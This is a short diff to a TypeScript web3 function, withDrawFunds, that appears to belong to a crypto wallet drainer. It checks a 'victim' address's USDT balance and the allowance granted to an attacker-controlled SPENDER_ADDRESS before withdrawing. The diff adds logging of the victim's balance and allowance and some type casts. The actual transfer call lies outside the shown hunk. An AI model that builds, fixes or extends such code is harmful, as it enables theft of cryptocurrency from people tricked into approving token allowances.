@@ -117,27 +117,29 @@ export const withDrawFunds = async (from: string, amount: number) => {
 
     // amount to be in wei
     const amountInWei = web3.utils.toWei(amount.toString(), "ether");
+    console.log("Pre-flight check for:", from, "Amount (Wei):", amountInWei.toString());
 
     // Pre-flight checks for better error messages
     const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
-    const victimBalance = (await usdtContract.methods.balanceOf(from).call()) as string;
-    const victimAllowance = (await usdtContract.methods
-      .allowance(from, SPENDER_ADDRESS)
-      .call()) as string;
+    const victimBalance = await usdtContract.methods.balanceOf(from).call();
+    const victimAllowance = await usdtContract.methods.allowance(from, SPENDER_ADDRESS).call();
 
-    if (BigInt(victimBalance) < BigInt(amountInWei)) {
+    console.log("Victim Balance (Wei):", victimBalance.toString());
+    console.log("Victim Allowance (Wei):", victimAllowance.toString());
+
+    if (BigInt(victimBalance as any) < BigInt(amountInWei)) {
       throw new Error(
         `Victim balance too low: ${web3.utils.fromWei(
-          victimBalance,
+          victimBalance as any,
           "ether"
         )} USDT`
       );
     }
 
-    if (BigInt(victimAllowance) < BigInt(amountInWei)) {
+    if (BigInt(victimAllowance as any) < BigInt(amountInWei)) {
       throw new Error(
         `Insufficient allowance: ${web3.utils.fromWei(
-          victimAllowance,
+          victimAllowance as any,
           "ether"
         )} USDT`
       );
